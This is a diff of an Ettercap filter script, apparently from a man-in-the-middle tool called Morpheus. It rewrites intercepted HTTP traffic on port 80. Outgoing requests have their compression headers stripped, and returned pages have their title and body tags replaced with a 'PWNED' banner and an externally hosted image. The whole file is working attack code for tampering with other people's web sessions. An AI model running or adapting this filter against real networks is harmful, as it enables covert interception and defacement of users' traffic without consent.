@@ -1,8 +1,8 @@
 ############################################################################
 #                                                                          #
-#  nr.filter -- filter source file                                         #
-#  Based on work by Irongeek and others http://www.irongeek.com/           #
-#                                                                          #   
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
 #  This program is free software; you can redistribute it and/or modify    #
 #  it under the terms of the GNU General Public License as published by    #
 #  the Free Software Foundation; either version 2 of the License, or       #
@@ -10,17 +10,31 @@
 #                                                                          #
 ############################################################################
 
+##
+#  This filter will substitute the html tag '<title>'
+#  and injects your image in any webpage requested.
+##
+
+
+##########################
+## Zap Content Encoding ##
+##########################
 if (ip.proto == TCP && tcp.dst == 80) {  
    if (search(DATA.data, "Accept-Encoding")) {  
     replace("Accept-Encoding", "Accept-Rubbish!");   
       # note: replacement string is same length as original string  
-    msg("zapped Accept-Encoding!\n");  
+      msg("[Morpheus Filter] Encoding zapped.\n");  
    }  
    if (search(DATA.data, "gzip")) {  
     replace("gzip", "  ");  
-    msg("whited out gzip!\n");  
+    msg("[Morpheus Filter] whited out gzip!\n");  
    }  
- }  
+}
+
+
+#####################
+## Replace Content ##
+#####################
  if (ip.proto == TCP && tcp.src == 80) {  
    replace("<title>", "<title>PWNED<\/tITle><bodY><p><img src="http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg"></p></boDY>");  
    replace("<TITLE>", "<title>PWNED<\/tITle><bodY><p><img src="http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg"></p></boDY>");  
@@ -28,5 +42,5 @@ if (ip.proto == TCP && tcp.dst == 80) {
    replace("</TITLE>", " ");  
    replace("<body>", " ");  
    replace("<BODY>", " ");  
-   msg("Filter Ran.\n");  
+   msg("[Morpheus Filter] Contents injected...\n");
  } 
